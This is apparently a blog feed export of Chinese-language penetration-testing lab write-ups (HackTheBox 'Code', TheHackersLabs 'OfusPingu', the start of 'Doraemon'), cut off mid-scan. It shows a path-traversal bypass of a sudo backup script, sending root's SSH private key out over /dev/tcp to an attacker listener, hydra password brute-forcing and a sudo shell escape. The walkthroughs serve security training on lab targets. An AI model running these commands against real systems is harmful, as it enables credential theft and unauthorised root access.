'.directories_to_archive[]')\n\nis_allowed_path() {\n    local path=\"$1\"\n    for allowed_path in \"${allowed_paths[@]}\"; do\n        if [[ \"$path\" == $allowed_path* ]]; then\n            return 0\n        fi\n    done\n    return 1\n}\n\nfor dir in $directories_to_archive; do\n    if ! is_allowed_path \"$dir\"; then\n        /usr/bin/echo \"Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.\"\n        exit 1\n    fi\ndone\n\n/usr/bin/backy \"$json_file\"\n```\n\nè„šæœ¬æ¥æ”¶`task.json` ï¼Œè¯»å– `directories_to_archive` å­—æ®µçš„ç›®å½•åˆ—è¡¨ï¼Œåªå…è®¸ `/var/` å’Œ `/home/` ç›®å½•ä¸‹çš„è·¯å¾„ï¼Œå…¶ä»–è·¯å¾„ä¼šè§¦å‘é”™è¯¯å¹¶é€€å‡º\n\nå°è¯•æ„é€ `Json`æ–‡ä»¶`task.json`\n\n```bash\n{\n\t\"directories_to_archive\":[\n\t\t\"/home/app-production/\"\n\t]\n}\n// run\nmartin@code:~$ sudo /usr/bin/backy.sh task.json \n2025/03/25 06:38:38 ğŸ€ backy 1.2\n2025/03/25 06:38:38 ğŸ“‹ Working with task.json ...\n2025/03/25 06:38:38 ğŸ”° Task configuration: destination must be specified!\n2025/03/25 06:38:38 â— Can't read provided task configuration\n```\n\nç¼ºå°‘`desination`å‚æ•°ï¼Œåº”è¯¥æ˜¯ä¿å­˜åˆ°å“ªçš„å‚æ•°\n\n```bash\n{\n\t\"directories_to_archive\":[\n\t\t\"/home/app-production/\"\n\t],\n\t\"destination\":\"/home/martin\"\n}\n// run\nmartin@code:~$ sudo /usr/bin/backy.sh task.json \n2025/03/25 06:41:28 ğŸ€ backy 1.2\n2025/03/25 06:41:28 ğŸ“‹ Working with task.json ...\n2025/03/25 06:41:28 ğŸ’¤ Nothing to sync\n2025/03/25 06:41:28 ğŸ“¤ Archiving: [/home/app-production]\n2025/03/25 06:41:28 ğŸ“¥ To: /home/martin ...\n2025/03/25 06:41:28 ğŸ“¦\n```\n\næ‰§è¡Œå®Œæˆåå¤šå‡ºæ¥ä¸€ä¸ªå‹ç¼©åŒ…\n\n```bash\nmartin@code:~$ ls\nbackups  code_home_app-production_2025_March.tar.bz2  task.json\n```\n\nå¯¹å…¶è¿›è¡Œè§£å‹ï¼Œè§£å‹å®Œæ¯•åå¯ä»¥å‘ç°æ˜¯ç”¨æˆ·`app-production` çš„å®¶ç›®å½•ï¼Œå¹¶ä¸”å­˜åœ¨`user.txt`\n\n```bash\nmartin@code:~/home/app-production$ cat user.txt \n4332e6b51ad86bfd87072af615996ff1\n```\n\nå†æ„é€ è¯»å–`root`çš„å®¶ç›®å½•\n\n```bash\n{\n\t\"directories_to_archive\":[\n\t\t\"/home/../root/\"\n\t],\n\t\"destination\":\"/home/martin\"\n}\n// run\nmartin@code:~$ sudo /usr/bin/backy.sh task.json \n2025/03/25 06:46:56 ğŸ€ backy 1.2\n2025/03/25 06:46:56 ğŸ“‹ Working with task.json ...\n2025/03/25 06:46:56 ğŸ’¤ Nothing to sync\n2025/03/25 06:46:56 ğŸ“¤ Archiving: [/home/root]\n2025/03/25 06:46:56 ğŸ“¥ To: /home/martin ...\n2025/03/25 06:46:56 ğŸ“¦\n2025/03/25 06:46:56 ğŸ’¢ Archiving failed for: /home/root\n2025/03/25 06:46:56 â— Archiving completed with errors\n```\n\næ„é€ åŒå†™ç»•è¿‡\n\n```bash\n{\n\t\"directories_to_archive\":[\n\t\t\"/home/....//root/\"\n\t],\n\t\"destination\":\"/home/martin\"\n}\n// run\nrtin@code:~$ sudo /usr/bin/backy.sh task.json \n2025/03/25 06:49:24 ğŸ€ backy 1.2\n2025/03/25 06:49:24 ğŸ“‹ Working with task.json ...\n2025/03/25 06:49:24 ğŸ’¤ Nothing to sync\n2025/03/25 06:49:24 ğŸ“¤ Archiving: [/home/../root]\n2025/03/25 06:49:24 ğŸ“¥ To: /home/martin ...\n2025/03/25 06:49:24 ğŸ“¦\n```\n\næˆåŠŸï¼Œè¯»å–root.txt\n\n```bash\nmartin@code:~/root$ cat root.txt \n372cf788ca3e30b86c01d19cb8bac1d9\n```\n\n## Get Root Shell\n\nè§£å‹é—®å°±æŒ‰åçœ‹åˆ°å­˜åœ¨`.ssh`æ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”å­˜åœ¨ç§é’¥`id_rsa`\n\nè½¬å‚¨ç§é’¥åˆ°æ”»å‡»æœº\n\n```bash\n// Kali\n**nc -lvp 1234 > sshkey**\n// Code\n**martin@code:~/root/.ssh$ cat id_rsa > /dev/tcp/10.10.16.7/1234**\n```\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image63.png)\n\nä¿®æ”¹æƒé™ä¸º`600` ï¼Œå¹¶ä½¿ç”¨ç§é’¥è¿›è¡Œç™»å½•\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/Code î‚° chmod 600 sshkey                      \nâš¡ root@kali î‚° ~/Desktop/test/Code î‚° ssh root@10.10.11.62 -i sshkey          \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)     \n                                                                              \n * Documentation:  https://help.ubuntu.com                                    \n * Management:     https://landscape.canonical.com                            \n * Support:        https://ubuntu.com/pro                                     \n                                                                              \n System information as of Tue 25 Mar 2025 07:10:19 AM UTC                     \n                                                                              \n  System load:           0.0                                                  \n  Usage of /:            51.3% of 5.33GB                                      \n  Memory usage:          13%                                                  \n  Swap usage:            0%                                                   \n  Processes:             236                                                  \n  Users logged in:       1                                                    \n  IPv4 address for eth0: 10.10.11.62                                          \n  IPv6 address for eth0: dead:beef::250:56ff:feb9:4461                        \n                                                                              \n                                                                              \nExpanded Security Maintenance for Applications is not enabled.                \n                                                                              \n0 updates can be applied immediately.                                         \n                                                                              \nEnable ESM Apps to receive additional future security updates.                \nSee https://ubuntu.com/esm or run: sudo pro status                            \n                                       \nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings \n                                                                              \n                                                                              \nLast login: Tue Mar 25 07:10:19 2025 from 10.10.16.7                          \nroot@code:~#                           \n```\n",
            "url": "https://www.sunsetaction.top/2025/08/06/HackTheBoxSeason7-Code",
            "title": "HackTheBox - Machine - Code",
            "summary": "Season7 Code https://app.hackthebox.com/machines/653 | esay å‰æœŸè¸©ç‚¹ å°±æ‰«æå‡ºä¸€ä¸ª22ç«¯å£ï¼Œä¸å¯¹åŠ²ç»§ç»­æ‰« æ–°ç«¯å£æ˜¯ä¸€ä¸ªä»£ç ç¼–è¾‘å™¨Python Code Editor WEB æ¸—é€ å¯ä»¥æ‰§è¡Œpythonå‘½ä»¤ï¼Œé¦–å…ˆå°è¯•ä¸€ä¸‹os åº“ æç¤ºUse ...",
            "date_modified": "2025-04-04T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Linuxé¶æœº"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/05/TheHackersLabsOfusPingu",
            "content_html": "\n# OfusPingu\n\n> https://labs.thehackerslabs.com/machine/102\n> \n\n![image.png](/post-images/TheHackersLabsOfusPingu/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  OfusPingu nmap -sn 192.168.56.0/24                      \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:31 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00042s latency).\nMAC Address: 0A:00:27:00:00:08 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00022s latency).\nMAC Address: 08:00:27:45:5E:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.103\nHost is up (0.00040s latency).\nMAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.5\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 27.97 seconds\n```\n\n```bash\nâœ  OfusPingu nmap -sT -min-rate 10000 -p- 192.168.56.103\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:34 CST\nNmap scan report for 192.168.56.103\nHost is up (0.00056s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3000/tcp open  ppp\nMAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.01 seconds\n```\n\n```bash\nâœ  OfusPingu nmap -sT -A -p 22,80,3000 192.168.56.103    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:36 CST\nNmap scan report for 192.168.56.103\nHost is up (0.00056s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 5c:08:d0:7c:02:65:4d:8b:95:7b:a2:89:af:ab:fc:9c (ECDSA)\n|_  256 af:ff:d1:1b:e2:5a:32:cb:23:47:71:2d:7a:2c:93:2e (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Ofuscaci\\xC3\\xB3n de C\\xC3\\xB3digo JavaScript | Seguridad en APIs\n|_http-server-header: Apache/2.4.62 (Debian)\n3000/tcp open  http    Node.js Express framework\n|_http-title: Error\nMAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.56 ms 192.168.56.103\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.49 seconds\n```\n\n### æšä¸¾\n\n`HTTP` 80 ç«¯å£\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image1.png)\n\nç›®å½•æ‰«æ\n\n```bash\nâœ  OfusPingu feroxbuster --url http://192.168.56.103 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x js,txt,zip,php\n  \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher ğŸ¤“                 ver: 2.11.0\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http://192.168.56.103\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ true\n ğŸ’²  Extensions            â”‚ [js, txt, zip, php]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET        1l       23w     1492c http://192.168.56.103/script.js\n200      GET      422l     1343w    17244c http://192.168.56.103/\n[####################] - 2m   1102740/1102740 0s      found:2       errors:965    \n[####################] - 2m   1102725/1102725 8759/s  http://192.168.56.103/\n```\n\n`script.js` å¾ˆæ˜æ˜¾å°±æ˜¯è¢«æ··æ·†è¿‡äº†\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image2.png)\n\né€šè¿‡ `AI` è¿›è¡Œæ¢å¤\n\n```bash\n// =======================================================\n//               ã€è¿˜åŸåçš„å¯è¯»ä»£ç ã€‘\n// =======================================================\n\n// å‡½æ•°ï¼šåˆå§‹åŒ–åº”ç”¨ç¨‹åº\nfunction inicializarAplicacion() {\n    // è¿™ä¸ª 'configParts' å˜é‡åœ¨è¿™æ®µä»£ç ä¸­å¹¶æœªå®šä¹‰ï¼Œ\n    // å®ƒå¾ˆå¯èƒ½æ˜¯åœ¨æ­¤è„šæœ¬åŠ è½½ä¹‹å‰çš„æŸä¸ªåœ°æ–¹å®šä¹‰çš„å…¨å±€å˜é‡ã€‚\n    // å‡è®¾ configParts = ['QWERTY', 'CHOCOLATITO', 'CHOCOLATON', 'CHINGON']\n    const API_KEY_SECRETA = configParts.map(f => f.toLowerCase()).join(''); \n    // ç»“æœä¼šæ˜¯ 'qwertychocolatitocholatonchingon'\n\n    // åº”ç”¨çš„é…ç½®å¯¹è±¡\n    const appConfig = {\n        version: '1.0.3',\n        entorno: 'produccion', // ç¯å¢ƒï¼šç”Ÿäº§\n        apiEndpoint: 'https://adivinaadivinanza/v3', // API åœ°å€\n        credenciales: {\n            usuario: 'jeje',\n            // é€šè¿‡ä¸€ç³»åˆ—å­—ç¬¦ä¸²æ“ä½œç”Ÿæˆè®¿é—®å‡­è¯\n            acceso: API_KEY_SECRETA.split('').reverse().join('') + '123'.split('').reverse().join('')\n            // 'qwertychocolatitocholatonchingon' -> åè½¬ -> 'nognihcnotalocotihtalocohcytrewq'\n            // '123' -> åè½¬ -> '321'\n            // æœ€ç»ˆçš„ acceso æ˜¯ 'nognihcnotalocotihtalocohcytrewq321'\n        },\n        features: {\n            darkMode: true,\n            analytics: false\n        }\n    };\n\n    // å‡½æ•°ï¼šè¿æ¥API\n    const conectarAPI = () => {\n        // å¯¹ 'acceso' å‡­è¯å†æ¬¡è¿›è¡Œå¤„ç†ï¼Œç”Ÿæˆæœ€ç»ˆçš„å¯†é’¥\n        const claveFinal = appConfig.credenciales.acceso.slice(0, -3).split('').reverse().join('');\n        // 1. å»æ‰æœ€å3ä¸ªå­—ç¬¦ ('321') -> 'nognihcnotalocotihtalocohcytrewq'\n        // 2. å†æ¬¡åè½¬ -> 'qwertychocolatitocholatonchingon' (æ¢å¤åŸæ ·)\n\n        console.log('Conectando la API con clave:', claveFinal); // \"è¿æ¥ APIï¼Œä½¿ç”¨å¯†é’¥: qwertychocolatitocholatonchingon\"\n        \n        // è¿”å›ä¸€ä¸ªæ¨¡æ‹Ÿçš„APIè¿æ¥æˆåŠŸå¯¹è±¡\n        return {\n            status: 200,\n            message: 'ConexiÃ³n exitosa', // \"è¿æ¥æˆåŠŸ\"\n            // å°† 'å¯†é’¥:admin' è¿›è¡Œ Base64 ç¼–ç ä½œä¸º token\n            token: btoa(claveFinal + ':' + 'admin') \n        };\n    };\n\n    // **å…³é”®é€»è¾‘**ï¼šåªæœ‰å½“ç½‘é¡µçš„åŸŸåæ˜¯ 'secretazosecreton' æ—¶ï¼Œæ‰æ‰§è¡Œè¿æ¥APIçš„æ“ä½œ\n    if (window.location.hostname === 'secretazosecreton') {\n        // 3ç§’åæ‰§è¡Œ\n        setTimeout(() => {\n            const m = conectarAPI();\n            console.log('Resultado conexiÃ³n:', m); // \"è¿æ¥ç»“æœ: ...\"\n        }, 3000);\n    }\n}\n\n// å½“æ•´ä¸ªé¡µé¢çš„HTMLåŠ è½½å’Œè§£æå®Œæˆåï¼Œæ‰§è¡Œä»¥ä¸‹ä»£ç \ndocument.addEventListener('DOMContentLoaded', () => {\n    // 1. åˆå§‹åŒ–åº”ç”¨\n    inicializarAplicacion();\n    \n    // 2. ç»™é¡µé¢ä¸Šæ‰€æœ‰çš„ <button> å…ƒç´ æ·»åŠ ç‚¹å‡»äº‹ä»¶ç›‘å¬\n    const buttons = document.querySelectorAll('button');\n    buttons.forEach(btn => {\n        btn.addEventListener('click', () => {\n            console.log('BotÃ³n clickeado'); // \"æŒ‰é’®è¢«ç‚¹å‡»äº†\"\n        });\n    });\n});\n\n// å‡½æ•°ï¼šéªŒè¯å¯†é’¥\nfunction validarClave(a) {\n    const claveReal = 'QWERTYCHOCOLATITOCHOCOLATONCHINGON';\n    return a === claveReal;\n}\n\n// è¿™æ˜¯ä¸€ä¸ªæ¨¡å—å¯¼å‡ºè¯­å¥ï¼Œå¸¸è§äº Node.js ç¯å¢ƒã€‚\n// æ„æ€æ˜¯å¦‚æœè¿™ä¸ªJSæ–‡ä»¶åœ¨æ”¯æŒæ¨¡å—åŒ–çš„ç¯å¢ƒï¼ˆå¦‚Node.jsï¼‰ä¸­è¢«å¼•ç”¨ï¼Œ\n// å®ƒä¼šå¯¼å‡ºä¸€ä¸ªåŒ…å« validarClave å‡½æ•°çš„å¯¹è±¡ã€‚\nif (typeof module !== 'undefined' && module.exports) {\n    module.exports = {\n        validarClave\n    };\n}\n```\n\nå¾—åˆ°ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚ç§˜é’¥ï¼š`QWERTYCHOCOLATITOCHOCOLATONCHINGON`\n\næ¥ä¸‹æ¥åˆ° `3000`ç«¯å£\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image3.png)\n\nå¯¹ `3000` ç«¯å£è¿›è¡Œ `fuzz` \n\n```bash\nâœ  OfusPingu wfuzz -u 'http://192.168.56.103:3000/FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hc 404\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.56.103:3000/FUZZ\nTotal requests: 74332\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                        \n=====================================================================\n\n000000823:   400        0 L      2 W        33 Ch       \"api\"                                                                                                                          \n000016154:   301        10 L     15 W       156 Ch      \"public\"                                                                                                                       \n000016155:   301        10 L     15 W       156 Ch      \"Public\"                                                                                                                       \n000022384:   400        0 L      2 W        21 Ch       \"view\"                                                                                                                         \n\nTotal time: 88.55361\nProcessed Requests: 74332\nFiltered Requests: 74328\nRequests/sec.: 839.4010\n```\n\n`api` ç›´æ¥è®¿é—®æç¤º\n\n```bash\n{\"error\":\"ParÃ¡metro incorrecto.\"}\n```\n\n`view` ç›´æ¥è®¿é—®æç¤º\n\n```bash\nParÃ¡metro incorrecto.\n```\n\nåœ¨å¯¹å…¶è¿›è¡Œæšä¸¾ï¼Œä½¿ç”¨ä¸Šè¾¹çš„ç§˜é’¥ä½œä¸ºå‚æ•°\n\n```bash\nâœ  OfusPingu wfuzz -u 'http://192.168.56.103:3000/api/?FUZZ=QWERTYCHOCOLATITOCHOCOLATONCHINGON' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hc=404,400\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.56.103:3000/api/?FUZZ=QWERTYCHOCOLATITOCHOCOLATONCHINGON\nTotal requests: 74332\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                        \n=====================================================================\n\n000020620:   200        0 L      1 W        30 Ch       \"token\"  \n```\n\næšä¸¾å‡ºæ¥ `token`\n\n```bash\nâœ  OfusPingu curl http://192.168.56.103:3000/api/\\?token\\=QWERTYCHOCOLATITOCHOCOLATONCHINGON                                                                     \n{\"key\":\"MI-KEY-SECRETA-12345\"}# \n```\n\nå¾—åˆ°ä¸€ä¸ª `key`\n\næˆ‘ä»¬å†æµ‹è¯• `view`\n\n```bash\nâœ  OfusPingu curl http://192.168.56.103:3000/view/\\?token\\=QWERTYCHOCOLATITOCHOCOLATONCHINGON\nParÃ¡metro incorrecto.#\n\nâœ  OfusPingu curl http://192.168.56.103:3000/view/\\?token\\=MI-KEY-SECRETA-12345\nParÃ¡metro incorrecto.#\n\nâœ  OfusPingu curl http://192.168.56.103:3000/view/\\?key\\='MI-KEY-SECRETA-12345'                  \n<!DOCTYPE html>        \n<html lang=\"es\">                                                                                \n<head>                                                                                          \n  <meta charset=\"UTF-8\">                        \n  <title>Zona Secreta</title\n  ...\n```\n\nå‘Šè¯‰æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¯†ç å’Œ `debian` è¿›è¡Œ `ssh` ç™»å½•\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image4.png)\n\nä½¿ç”¨ `hydra` è¿›è¡Œçˆ†ç ´\n\n```bash\nâœ  OfusPingu hydra -l debian -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.103 ssh                                                                                                       \nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-05 19:53:26\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task\n[DATA] attacking ssh://192.168.56.103:22/\n[22][ssh] host: 192.168.56.103   login: debian   password: chocolate\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-05 19:53:41\n```\n\nè¿›å…¥åèƒ½è¯»åˆ° `user.txt`\n\n```bash\ndebian@OfusPingu:~$ cat flag.txt \n457xxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## æƒé™æå‡\n\n`.bash_history` æ²¡åˆ æ‰ï¼Œä½†æ˜¯å†…å®¹è²Œä¼¼æ²¡æœ‰å¾ˆæœ‰ç”¨\n\n```bash\ndebian@OfusPingu:~$ ls -la\ntotal 36\ndrwx------ 4 debian debian 4096 Jun  7 12:09 .\ndrwxr-xr-x 3 root   root   4096 Jun  7 10:52 ..\n-rw------- 1 debian debian  387 Jun  7 12:16 .bash_history\n-rw-r--r-- 1 debian debian  220 Jun  7 10:52 .bash_logout\n-rw-r--r-- 1 debian debian 3526 Jun  7 10:52 .bashrc\n-rw-r--r-- 1 root   root     33 Jun  7 12:09 flag.txt\ndrwxr-xr-x 3 debian debian 4096 Jun  7 12:05 .local\ndrwxr-xr-x 4 root   root   4096 Jun  7 17:03 mi-web\n-rw-r--r-- 1 debian debian  807 Jun  7 10:52 .profile\n\ndebian@OfusPingu:~$ cat .bash_history \nsudo -l\nsudo /usr/bin/rename\nsudo /usr/bin/rename -h\nsudo /usr/bin/rename -m\nexit\nls\ncd mi-web/\nls\npwd\nsudo su\nsudo -l\nsudo /usr/bin/rename\nsudo /usr/bin/rename -m\ngrub-mkpasswd-pbkdf2\ntouch /etc/grub.d/01_password && chmod a+x /etc/grub.d/01_password\nnano /etc/grub.d/01_password\nsudo nano /etc/grub.d/01_password\nsudo su\nsudo -l\nsudo /usr/bin/rename -m\nsudo -l\nsudo /usr/bin/rename -m\n```\n\næŸ¥çœ‹ `sudo` æƒé™\n\n```bash\ndebian@OfusPingu:~$ sudo -l\nMatching Defaults entries for debian on OfusPingu:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser debian may run the following commands on OfusPingu:\n    (ALL) NOPASSWD: /usr/bin/rename\n```\n\nç»“æŸäº†ï¼Œè·Ÿç€`.bash_history` æ•² `sudo /usr/bin/rename -m` ä¼šè¿›å…¥å¸®åŠ©\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image5.png)\n\nç„¶åå¯ä»¥è¾“å…¥`esc` + `!/bin/bash` å³å¯åˆ‡æ¢åˆ° `root shell` ï¼Œè¿™é‡Œç±»ä¼¼äºä½¿ç”¨ `less` æˆ–è€… `more`ç­‰æ¥ææƒ\n\n![image.png](/post-images/TheHackersLabsOfusPingu/image6.png)\n\nè¯»å– `root.txt`\n\n```bash\nroot@OfusPingu:~# cat root.txt \nD99xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/08/05/TheHackersLabsOfusPingu",
            "title": "TheHackersLabs - OfusPingu",
            "summary": "OfusPingu https://labs.thehackerslabs.com/machine/102 Recon PortScan æšä¸¾ HTTP 80 ç«¯å£ ç›®å½•æ‰«æ script.js å¾ˆæ˜æ˜¾å°±æ˜¯è¢«æ··æ·†è¿‡äº† é€šè¿‡ AI è¿›è¡Œæ¢å¤ å¾—åˆ°ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚ç§˜é’¥ï¼šQWERTYCHOCOLATITOC...",
            "date_modified": "2025-08-05T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Linux",
                "API",
                "rename",
                "hydra"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon",
            "content_html": "\n# Doraemon\n\n> https://labs.thehackerslabs.com/machine/30\n> \n\n![image.png](/post-images/TheHackersLabsDoraemon/image.png)\n\n## Recon\n\n### PortScan\n\n```scheme\nâœ  Doraemon nmap -sn 192.168.10.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:52 CST\nNmap scan report for 192.168.10.1\nHost is up (0.00057s latency).\nMAC Address: 0A:00:27:00:00:10 (Unknown)\nNmap scan report for 192.168.10.5\nHost is up (0.00081s latency).\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.10.7\nHost is up (0.00050s latency).\nMAC Address: 08:00:27:34:2C:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.10.100\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 2.26 seconds\n```\n\n```scheme\nâœ  Doraemon nmap -sT -min-rate 10000 -p- 192.168.10.5\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST\nWarning: 192.168.10.5 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.10.5\nHost is up (0.00038s latency).\nNot shown: 64597 closed tcp ports (conn-refused), 913 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49671/tcp open  unknown\n49673/tcp open  unknown\n49676/tcp open  unknown\n49687/tcp open  unknown\n49705/tcp open  unknown\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```scheme\nâœ  Doraemon nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.5\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST\nNmap scan report for 192.168.10.5\nHost is up (0.00049s latency).\n\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain       Simple DNS Plus\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-03 08:53:47Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: DORAEMON)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 